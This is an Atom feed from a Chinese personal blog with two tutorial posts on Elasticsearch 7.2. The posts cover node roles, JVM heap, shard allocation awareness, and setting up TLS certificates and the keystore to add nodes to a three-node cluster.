<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>个人博客</title>
  
  <subtitle>记录工作中的点点滴滴</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://yongnights.github.io/"/>
  <updated>2019-12-31T06:58:15.280Z</updated>
  <id>https://yongnights.github.io/</id>
  
  <author>
    <name>永夜初晗凝碧天</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>elastic stack 7.2技术栈【一】Elasticsearch 7.2 技术栈安装与配置概要的说明</title>
    <link href="https://yongnights.github.io/2019/12/31/elastic%20stack%207.2%E6%8A%80%E6%9C%AF%E6%A0%88%E3%80%90%E4%B8%80%E3%80%91%E2%80%94%E2%80%94%20%E9%9C%80%E8%A6%81%E6%8E%8C%E6%8F%A1%E7%9A%84%E4%B8%80%E4%BA%9Belastic%E9%87%8D%E8%A6%81%E6%A6%82%E5%BF%B5%E4%B8%8E%E9%85%8D%E7%BD%AE%E5%8F%82%E6%95%B0/"/>
    <id>https://yongnights.github.io/2019/12/31/elastic stack 7.2技术栈【一】—— 需要掌握的一些elastic重要概念与配置参数/</id>
    <published>2019-12-31T06:51:26.175Z</published>
    <updated>2019-12-31T06:58:15.280Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Tue Dec 31 2019 15:01:50 GMT+0800 (GMT+08:00) --><h1 id="Elasticsearch-7-2-技术栈安装与配置概要的说明"><a href="#Elasticsearch-7-2-技术栈安装与配置概要的说明" class="headerlink" title="Elasticsearch 7.2 技术栈安装与配置概要的说明"></a>Elasticsearch 7.2 技术栈安装与配置概要的说明</h1><p>我们将大体上按以下步骤逐步安装和配置出一套满足生产环境运行要求和信息安全管理要求的三节点es服务集群。</p><ol><li><p>在节点1上面先行安装一套es+kinaba+beats的单节点服务<br>详细步骤可以参考官网这个教程：get-started-elastic-stack</p></li><li><p>继续在单节点的结构下启用和配置出es安全管理功能<br>详细步骤可以参考官网这个教程：security-getting-started</p></li><li><p>进行面向支持多节点的加密通信改造的相关配置，同时将节点2、3加入es集群中<br>详细步骤可以参考官网这个教程：encrypting-internode-communications</p></li></ol><p>我们之所以没有选择按一步到位的方法部署整套es集群，是因为在启用和配置xpack的部分很容易遇到问题。参照上面的三个步骤，可以依次部署、配置并对结果进行验证，在前一步骤部署成功的基础上继续做更多内容的部署，这样处理的成功率会比较高。</p><a id="more"></a><h1 id="版本及许可的说明"><a href="#版本及许可的说明" class="headerlink" title="版本及许可的说明"></a>版本及许可的说明</h1><p>操作系统使用centos7 minimual，升级到最新小版本。<br>elasticsearch技术栈均采用 7.2版本，默认使用basic许可，可免费使用xpack部分安全管理服务。<br>使用官网下载的tar.gz安装包进行部署。</p><h1 id="一些elastic重要概念与配置参数"><a href="#一些elastic重要概念与配置参数" class="headerlink" title="一些elastic重要概念与配置参数"></a>一些elastic重要概念与配置参数</h1><p>ES 是在 lucene 的基础上进行研发的，隐藏了 lucene 的复杂性，提供简单易用的 RESTful Api接口。ES 的分片相当于 lucene 的索引。</p><h2 id="Node-节点的几种部署实例"><a href="#Node-节点的几种部署实例" class="headerlink" title="Node 节点的几种部署实例"></a>Node 节点的几种部署实例</h2><p>实例一: 只用于数据存储和数据查询，降低其资源消耗率<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node.master: false</span><br><span class="line">node.data: true</span><br></pre></td></tr></table></figure><p></p><p>实例二: 来协调各种创建索引请求或者查询请求，但不存储任何索引数据<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node.master: true</span><br><span class="line">node.data: false</span><br></pre></td></tr></table></figure><p></p><p>实例三: 主要用 于查询负载均衡， 并请求分发到多个指定的node服务器，并对各个node服务器返回的结果进行一个汇总处理，最终返回给客户端<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node.master: false</span><br><span class="line">node.data: false</span><br></pre></td></tr></table></figure><p></p><p>实例四: 即有成为主节点的资格，又存储数据<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node.master: true</span><br><span class="line">node.data: true</span><br></pre></td></tr></table></figure><p></p><p>在只有3个节点的部署方案中，建议设置3个节点均有成为master节点的资格，且存储索引数据。</p><p>数据目录配置与物理磁盘的使用<br>一般来说，是这样配置：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">path:</span><br><span class="line">  logs: /var/log/elasticsearch</span><br><span class="line">  data: /var/data/elasticsearch</span><br></pre></td></tr></table></figure><p></p><p>数据目录可以支持使用多个：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">path:</span><br><span class="line">  data:</span><br><span class="line">    - /mnt/elasticsearch_1</span><br><span class="line">    - /mnt/elasticsearch_2</span><br><span class="line">    - /mnt/elasticsearch_3</span><br></pre></td></tr></table></figure><p></p><p>物理磁盘的使用：</p><ul><li>由于es已经提供了数据副本的冗余，所以建议使用raid0，不通过raid提供额外的数据保护；</li><li>当有多块数据盘时，通过path.data配置把数据条带化分配到多块盘上是可行的，但建议是通过设置raid0将多块物理磁盘整合为一块逻辑盘使用，以确保每个分片都是被放入的同样的目录；<h2 id="集群名称配置"><a href="#集群名称配置" class="headerlink" title="集群名称配置"></a>集群名称配置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cluster.name: logging-prod</span><br></pre></td></tr></table></figure></li></ul><h2 id="node节点名称"><a href="#node节点名称" class="headerlink" title="node节点名称"></a>node节点名称</h2><p>默认为使用主机名，也可以在elasticsearch.yml中指定。在一个主机上同时跑多个es实例时，这个配置项就会很有帮助了。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node.name: prod-data-2</span><br></pre></td></tr></table></figure><p></p><h2 id="网络地址配置"><a href="#网络地址配置" class="headerlink" title="网络地址配置"></a>网络地址配置</h2><p>默认将服务绑定到loopback接口，这需要按实际情况调整。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">network.host: 10.20.0.11</span><br></pre></td></tr></table></figure><p></p><p>注：变更服务绑定接口后，会被认为是作为生产环境使用，会触发es的环境检查操作。当有不符要求的系统或集群配置参数时，es服务会无法启动。</p><h2 id="节点发现和cluster初始化参数"><a href="#节点发现和cluster初始化参数" class="headerlink" title="节点发现和cluster初始化参数"></a>节点发现和cluster初始化参数</h2><p>单播主机列表通过discovery.zen.ping.unicast.hosts来配置。<br>这个配置在 elasticsearch.yml 文件中：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">discovery.zen.ping.unicast.hosts: [&quot;host1&quot;, &quot;host2:port&quot;]</span><br></pre></td></tr></table></figure><p></p><p>具体的值是一个主机数组或逗号分隔的字符串。每个值应采用host：port或host的形式（其中port默认为设置transport.profiles.default.port，如果未设置则返回transport.tcp.port）。请注意，必须将IPv6主机置于括号内。此设置的默认值为127.0.0.1，[:: 1]。</p><p>使用单播，你可以为 Elasticsearch 提供一些它应该去尝试连接的节点列表。当一个节点联系到单播列表中的成员时，它就会得到整个集群所有节点的状态，然后它会联系 master 节点，并加入集群。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">discovery.seed_hosts:</span><br><span class="line">   - 192.168.1.10:9300</span><br><span class="line">   - 192.168.1.11</span><br><span class="line">   - seeds.mydomain.com</span><br><span class="line">cluster.initial_master_nodes:</span><br><span class="line">   - master-node-a</span><br><span class="line">   - master-node-b</span><br><span class="line">   - master-node-c</span><br></pre></td></tr></table></figure><p></p><p>提供了seed.hosts参数的三种赋值方式</p><ul><li>initial_master_nodes参数只能使用节点的node.name参数值，一般来说是主机名</li><li>Zen Discovery 是 ES 默认内建发现机制。它提供单播和多播的发现方式，并且可以扩展为通过插件支持云环境和其他形式的发现。</li><li>Elasticsearch 官方推荐我们使用 单播 代替 组播。而且 Elasticsearch 默认被配置为使用 单播 发现，以防止节点无意中加入集群。</li></ul><h2 id="设置JVM-heap-size"><a href="#设置JVM-heap-size" class="headerlink" title="设置JVM heap size"></a>设置JVM heap size</h2><p>通过jvm.options文件设置jvm缓存参数，过大或过小都不好，过大的缓存也会让垃圾回收变慢。</p><p>当jvm缓存设置大于26GB时，需要评估zero-based compressed oops限制，参见下面的说明：<br><a href="https://www.elastic.co/guide/en/elasticsearch/reference/current/heap-size.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/current/heap-size.html</a></p><p>由于ES构建基于lucene, 而lucene设计强大之处在于lucene能够很好的利用操作系统内存来缓存索引数据，以提供快速的查询性能。lucene的索引文件segements是存储在单文件中的，并且不可变，对于OS来说，能够很友好地将索引文件保持在cache中，以便快速访问；因此，我们很有必要将一半的物理内存留给lucene ; 另一半的物理内存留给ES（JVM heap )。所以， 在ES内存设置方面，可以遵循以下原则：</p><ul><li><p>当机器内存小于64G时，遵循通用的原则，50%给ES，50%留给lucene。</p></li><li><p>当机器内存大于64G时，遵循以下原则：<br>a. 如果主要的使用场景是全文检索, 那么建议给ES Heap分配 4~32G的内存即可；其它内存留给操作系统, 供lucene使用（segments cache), 以提供更快的查询性能。<br>b. 如果主要的使用场景是聚合或排序， 并且大多数是numerics, dates, geo_points 以及not_analyzed的字符类型， 建议分配给ES Heap分配 4~32G的内存即可，其它内存留给操作系统，供lucene使用(doc values cache)，提供快速的基于文档的聚类、排序性能。<br>c. 如果使用场景是聚合或排序，并且都是基于analyzed 字符数据，这时需要更多的 heap size, 建议机器上运行多ES实例，每个实例保持不超过50%的ES heap设置(但不超过32G，堆内存设置32G以下时，JVM使用对象指标压缩技巧节省空间)，50%以上留给lucene。</p></li><li><p>禁止swap，一旦允许内存与磁盘的交换，会引起致命的性能问题。 通过： 在elasticsearch.yml 中 bootstrap.memory_lock: true， 以保持JVM锁定内存，保证ES的性能。操作系统通过交换（swap）将内存的分页写入磁盘，es在内存中保留了很多运行时必需的数据和缓存，所以消耗磁盘的操作将严重影响正在运行的集群。<br>关闭es交换最彻底的方法是，在elasticsearch.yml文件中将bootstrap.mlockall设置为true 。</p></li><li><p>GC设置原则：<br>a. 保持GC的现有设置，默认设置为：Concurrent-Mark and Sweep (CMS)，别换成G1GC，因为目前G1还有很多BUG。<br>b. 保持线程池的现有设置，目前ES的线程池较1.X有了较多优化设置，保持现状即可；默认线程池大小等于CPU核心数。如果一定要改，按公式（（CPU核心数* 3）/ 2）+ 1 设置；不能超过CPU核心数的2倍；但是不建议修改默认配置，否则会对CPU造成硬伤。</p><h2 id="Temp-directory配置"><a href="#Temp-directory配置" class="headerlink" title="Temp directory配置"></a>Temp directory配置</h2><p>在使用.tar.gz方式部署es服务时，建议指定一个安全的临时文件目录，避免因为默认使用的/tmp下的临时目录被操作系统定期删除，造成服务故障。<br>通过环境变量 <code>$ES_TMPDIR</code> 来设置。</p></li></ul><h2 id="分片分配的感知"><a href="#分片分配的感知" class="headerlink" title="分片分配的感知"></a>分片分配的感知</h2><p>分配感知（allocation awareness）是管理在哪里放置数据的副本。<br><a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.2/allocation-awareness.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.2/allocation-awareness.html</a></p><h3 id="1-基于分片的分配"><a href="#1-基于分片的分配" class="headerlink" title="1. 基于分片的分配"></a>1. 基于分片的分配</h3><p>分配感知允许用户使用自定义的参数来配置分片的分配。通过定义一组键，然后在合适的节点上设置这个键，就可以开启分配感知。<br>elasticsearch.yml<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cluster.routing.allocation.awareness.attributes: rack_id</span><br></pre></td></tr></table></figure><p></p><p>注：支持赋多个值同时用作感知属性，如cluster.routing.allocation.awareness.attributes: rack, group, zone</p><p>针对每个es节点，用户可以修改elasticsearch.yml，按期待的网络配置来设置该值。ES允许用户在节点上设置元数据，这些元数据的键将成为我们要使用的分配感知参数。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">node.attr.rack_id: rack_one</span><br></pre></td></tr></table></figure><p></p><p>当有多个es节点可用时，es会尽量把分片与副本均衡到rack_id值不同的节点上去。但如果只剩一个可用的es数据节点了，es也会选择把一个索引的分片和副本全部部署在同一个节点上面。</p><p>常见的使用场景是按照地点、机架或是虚拟机等来划分集群的拓扑。</p><h3 id="2-强制性的分配感知"><a href="#2-强制性的分配感知" class="headerlink" title="2. 强制性的分配感知"></a>2. 强制性的分配感知</h3><p>在用户事先规则好分片分组信息，且希望限制每个分组的副本分片数量时，强制分配感知是适用的解决方法。<br>在这种情况下，即便因为部分分组的数据节点不可用，导致es服务可用性风险，es也不会把索引的分片与副本都部署在相同的分组节点上面。</p><p>例如，用户想在区域级别使用强制分配。可以先指定一个zone的属性，然后为该分组添加多个维度。如下所示：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cluster.routing.allocation.awareness.attributes: zone</span><br><span class="line">cluster.routing.allocation.force.zone.values: us-east, us-west</span><br></pre></td></tr></table></figure><p></p><p>此时，我们在东部地区启用了一批节点，这些节点的配置都是node.attr.zone: us-east ，在创建索引时由于以上限制，副本分片只会被均衡到没有相应zone值的节点上去。</p><h3 id="3-动态设置分片感知"><a href="#3-动态设置分片感知" class="headerlink" title="3. 动态设置分片感知"></a>3. 动态设置分片感知</h3><p>可以通过集群设置API在运行时进行修改，这个修改的效果可以自行选择是持久的，还是临时性的。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">curl -XPUT localhost:9200/_cluster/settings -d &apos;&#123;</span><br><span class="line">  &quot;persistent&quot;: &#123;</span><br><span class="line">  &quot;cluster.routing.allocation.awareness.attributes&quot;: zone</span><br><span class="line">  &quot;cluster.routing.allocation.force.zone.values&quot;: us-east, us-west</span><br><span class="line">  &#125;</span><br><span class="line">&#125;&apos;</span><br></pre></td></tr></table></figure><p></p><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
      &lt;!-- build time:Tue Dec 31 2019 15:01:50 GMT+0800 (GMT+08:00) --&gt;&lt;h1 id=&quot;Elasticsearch-7-2-技术栈安装与配置概要的说明&quot;&gt;&lt;a href=&quot;#Elasticsearch-7-2-技术栈安装与配置概要的说明&quot; class=&quot;headerlink&quot; title=&quot;Elasticsearch 7.2 技术栈安装与配置概要的说明&quot;&gt;&lt;/a&gt;Elasticsearch 7.2 技术栈安装与配置概要的说明&lt;/h1&gt;&lt;p&gt;我们将大体上按以下步骤逐步安装和配置出一套满足生产环境运行要求和信息安全管理要求的三节点es服务集群。&lt;/p&gt;&lt;ol&gt;&lt;li&gt;&lt;p&gt;在节点1上面先行安装一套es+kinaba+beats的单节点服务&lt;br&gt;详细步骤可以参考官网这个教程：get-started-elastic-stack&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;继续在单节点的结构下启用和配置出es安全管理功能&lt;br&gt;详细步骤可以参考官网这个教程：security-getting-started&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;进行面向支持多节点的加密通信改造的相关配置，同时将节点2、3加入es集群中&lt;br&gt;详细步骤可以参考官网这个教程：encrypting-internode-communications&lt;/p&gt;&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;我们之所以没有选择按一步到位的方法部署整套es集群，是因为在启用和配置xpack的部分很容易遇到问题。参照上面的三个步骤，可以依次部署、配置并对结果进行验证，在前一步骤部署成功的基础上继续做更多内容的部署，这样处理的成功率会比较高。&lt;/p&gt;
    
    </summary>
    
      <category term="elk" scheme="https://yongnights.github.io/categories/elk/"/>
    
    
      <category term="elk" scheme="https://yongnights.github.io/tags/elk/"/>
    
  </entry>
  
  <entry>
    <title>elastic stack 7.2技术栈【五】向es集群中增加更多节点并配置节点间的加密通信</title>
    <link href="https://yongnights.github.io/2019/12/31/elastic%20stack%207.2%E6%8A%80%E6%9C%AF%E6%A0%88%E3%80%90%E4%BA%94%E3%80%91%E2%80%94%E2%80%94%20%E5%90%91es%E9%9B%86%E7%BE%A4%E4%B8%AD%E5%A2%9E%E5%8A%A0%E6%9B%B4%E5%A4%9A%E8%8A%82%E7%82%B9%E5%B9%B6%E9%85%8D%E7%BD%AE%E8%8A%82%E7%82%B9%E9%97%B4%E7%9A%84%E5%8A%A0%E5%AF%86%E9%80%9A%E4%BF%A1/"/>
    <id>https://yongnights.github.io/2019/12/31/elastic stack 7.2技术栈【五】—— 向es集群中增加更多节点并配置节点间的加密通信/</id>
    <published>2019-12-31T06:51:26.172Z</published>
    <updated>2019-12-31T06:59:05.840Z</updated>
    
    <content type="html"><![CDATA[<!-- build time:Tue Dec 31 2019 15:01:50 GMT+0800 (GMT+08:00) --><p>本章节的配置内容，是建立在成功部署和配置了前面几个章节的基础之上。</p><h2 id="制作数字证书"><a href="#制作数字证书" class="headerlink" title="制作数字证书"></a>制作数字证书</h2><p>在一个安全的集群中，Elasticsearch节点在与其他节点通信时会使用证书来标识自己。<br>群集必须验证这些证书的真实性。 建议的方法是信任特定的证书颁发机构（CA）。 因此，当节点添加到群集时，需要他们使用由同一CA签名的证书。</p><p>制作ca证书：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/elasticsearch-certutil ca</span><br></pre></td></tr></table></figure><p></p><p>使用默认输出文件名elastic-stack-ca.p12，并为证书设置访问口令：my-elastic123。如果是你的生产集群，请注意做好证书和口令的保护。<br>创建一个目录用于存放证书：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd $&#123;ES_HOME&#125;/config</span><br><span class="line">mkdir certs</span><br></pre></td></tr></table></figure><p></p><p>为节点1制作证书和密钥：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/elasticsearch-certutil cert --ca elastic-stack-ca.p12 --ip 10.20.0.11 --out config/certs/es-node1.p12</span><br></pre></td></tr></table></figure><p></p><ul><li>输入ca的口令，并为节点1的证书设置口令为：es-node123</li><li>elasticsearch-certutil工具提供了更多复杂的证书管理功能，如果有使用需求可以参见：<a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.2/certutil.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.2/certutil.html</a></li></ul><a id="more"></a><h2 id="配置集群节点间的加密通信"><a href="#配置集群节点间的加密通信" class="headerlink" title="配置集群节点间的加密通信"></a>配置集群节点间的加密通信</h2><p>编辑elasticsearch.yml文件，修改以下参数。</p><p>1）禁用single-node discovery：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">discovery.type: single-node</span><br></pre></td></tr></table></figure><p></p><p>我们之前为了调试单节点的es功能而启用的这个参数，现在直接从配置文件中清除这一配置项，使用默认值即可。<br>2）设置这次启动中有资格成为master节点的主机列表：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cluster.initial_master_nodes: [&quot;es-node1&quot;]</span><br></pre></td></tr></table></figure><p></p><p>因为此时我们还只有一个节点。如果是已经有多个具备master node资格的节点时，则这里需要把它们都维护在列表中。<br>这一参数仅在集群初次建立时有用。<br>3）为传输（节点间）通信启用传输层安全性（TLS / SSL）：<br>ES_PATH_CONF/elasticsearch.yml<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xpack.security.enabled: true</span><br><span class="line">xpack.security.transport.ssl.enabled: true</span><br><span class="line">xpack.security.transport.ssl.keystore.path: certs/$&#123;node.name&#125;.p12</span><br><span class="line">xpack.security.transport.ssl.truststore.path: certs/$&#123;node.name&#125;.p12</span><br></pre></td></tr></table></figure><p></p><p>将PKCS＃12文件的密码存储在Elasticsearch密钥库中。<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./bin/elasticsearch-keystore create</span><br><span class="line">./bin/elasticsearch-keystore add xpack.security.transport.ssl.keystore.secure_password</span><br><span class="line">./bin/elasticsearch-keystore add xpack.security.transport.ssl.truststore.secure_password</span><br></pre></td></tr></table></figure><p></p><ul><li>如果elasticsearch keystore文件已经存在了，则可以跳过创建命令</li><li>系统将提示你提供为es-node1.p12文件创建的密码。 我们将此文件用于传输TLS密钥库和信任库，因此为这两个设置提供相同的密码。<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[elastic@es-node1 elasticsearch-7.2.0]$ ./bin/elasticsearch-keystore list</span><br><span class="line">keystore.seed</span><br><span class="line">xpack.security.transport.ssl.keystore.secure_password</span><br><span class="line">xpack.security.transport.ssl.truststore.secure_password</span><br></pre></td></tr></table></figure></li></ul><p>重新启动es服务：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/elasticsearch</span><br></pre></td></tr></table></figure><p></p><p>以及kibana服务：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/kibana</span><br></pre></td></tr></table></figure><p></p><h2 id="向es集群中添加更多的节点"><a href="#向es集群中添加更多的节点" class="headerlink" title="向es集群中添加更多的节点"></a>向es集群中添加更多的节点</h2><p>es可以使用的节点有很多类型，详见：<a href="https://www.elastic.co/guide/en/elasticsearch/reference/7.2/modules-node.html" target="_blank" rel="noopener">https://www.elastic.co/guide/en/elasticsearch/reference/7.2/modules-node.html</a> 。<br>我们在这里向集群中添加两个节点，每个节点都既作为master-eligible node（node.master: true），也作为data node（node.data： true）。</p><p>1）我们先配置好另外的两个主机节点</p><ul><li>参照本文第一部分的内容对系统进行初始化配置；</li><li><p>参照本文第二部分，第1章节的内容部署elasticsearch程序，暂不启动es服务；<br>2）在节点1上为新增的两个节点制作证书</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/elasticsearch-certutil cert --ca elastic-stack-ca.p12 --multiple</span><br></pre></td></tr></table></figure></li><li><p>依次为es-node2, es-node3生成证书，得到名为certificate-bundle.zip的输出文件；</p></li><li>为简单起见，统一将两个新节点证书的密码也设置为和节点1相同的 es-node123 ；</li><li>将解压缩后得到证书文件，参照节点1的存放路径（/opt/elasticsearch-7.2.0/config/certs），分别部署到节点2和节点3上去。<br>3）编辑3个节点的ES_PATH_CONF/elasticsearch.yml文件</li></ul><p>节点es-node1：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cluster.name: my-elastic</span><br><span class="line">node.name: es-node1</span><br><span class="line">bootstrap.memory_lock: true</span><br><span class="line">network.host: 10.20.0.11</span><br><span class="line">cluster.initial_master_nodes: [&quot;es-node1&quot;,&quot;es-node2&quot;,&quot;es-node3&quot;]</span><br><span class="line">discovery.seed_hosts: [&quot;10.20.0.11&quot;,&quot;10.20.0.12&quot;,&quot;10.20.0.13&quot;]</span><br><span class="line">xpack.security.enabled: true</span><br><span class="line">xpack.security.transport.ssl.enabled: true</span><br><span class="line">xpack.security.transport.ssl.keystore.path: certs/$&#123;node.name&#125;.p12</span><br><span class="line">xpack.security.transport.ssl.truststore.path: certs/$&#123;node.name&#125;.p12</span><br></pre></td></tr></table></figure><p></p><p>节点es-node2：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">cluster.name: my-elastic</span><br><span class="line">node.name: es-node2</span><br><span class="line">bootstrap.memory_lock: true</span><br><span class="line">network.host: 10.20.0.12</span><br><span class="line">cluster.initial_master_nodes: [&quot;es-node1&quot;,&quot;es-node2&quot;,&quot;es-node3&quot;]</span><br><span class="line">discovery.seed_hosts: [&quot;10.20.0.11&quot;,&quot;10.20.0.12&quot;,&quot;10.20.0.13&quot;]</span><br><span class="line">xpack.security.enabled: true</span><br><span class="line">xpack.security.transport.ssl.enabled: true</span><br><span class="line">xpack.security.transport.ssl.keystore.path: certs/$&#123;node.name&#125;.p12</span><br><span class="line">xpack.security.transport.ssl.truststore.path: certs/$&#123;node.name&#125;.p12</span><br></pre></td></tr></table></figure><p></p><p>节点es-node3：<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cluster.name: my-elastic</span><br><span class="line">node.name: es-node3</span><br><span class="line">bootstrap.memory_lock: true</span><br><span class="line">network.host: 10.20.0.13</span><br><span class="line">cluster.initial_master_nodes: [&quot;es-node1&quot;,&quot;es-node2&quot;,&quot;es-node3&quot;]</span><br><span class="line">discovery.seed_hosts: [&quot;10.20.0.11&quot;,&quot;10.20.0.12&quot;,&quot;10.20.0.13&quot;]xpack.security.enabled: true</span><br><span class="line">xpack.security.transport.ssl.enabled: true</span><br><span class="line">xpack.security.transport.ssl.keystore.path: certs/$&#123;node.name&#125;.p12</span><br><span class="line">xpack.security.transport.ssl.truststore.path: certs/$&#123;node.name&#125;.p12</span><br></pre></td></tr></table></figure><p></p><p>4）将两个新节点的PKCS#12 证书口令存储在Elasticsearch Keystore中<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./bin/elasticsearch-keystore create</span><br><span class="line">./bin/elasticsearch-keystore add xpack.security.transport.ssl.keystore.secure_password</span><br><span class="line">./bin/elasticsearch-keystore add xpack.security.transport.ssl.truststore.secure_password</span><br></pre></td></tr></table></figure><p></p><p>根据提示，将节点证书的密码信息es-node123保存到es密钥库中<br>5）依次启动三个节点上的es服务<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/elasticsearch</span><br></pre></td></tr></table></figure><p></p><p>注意观察日志输出<br>启动kibana，在dev tools中执行GET _cluster/health 查看集群健康状态。<br><img src="https://img-blog.csdnimg.cn/20190716172517303.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dhdGVybWVsb25iaWc=,size_16,color_FFFFFF,t_70" alt></p><p>执行 GET _cat/nodes?v 查看master node角色分布：<br><img src="https://img-blog.csdnimg.cn/20190716172529482.png" alt></p><!-- rebuild by neat -->]]></content>
    
    <summary type="html">
    
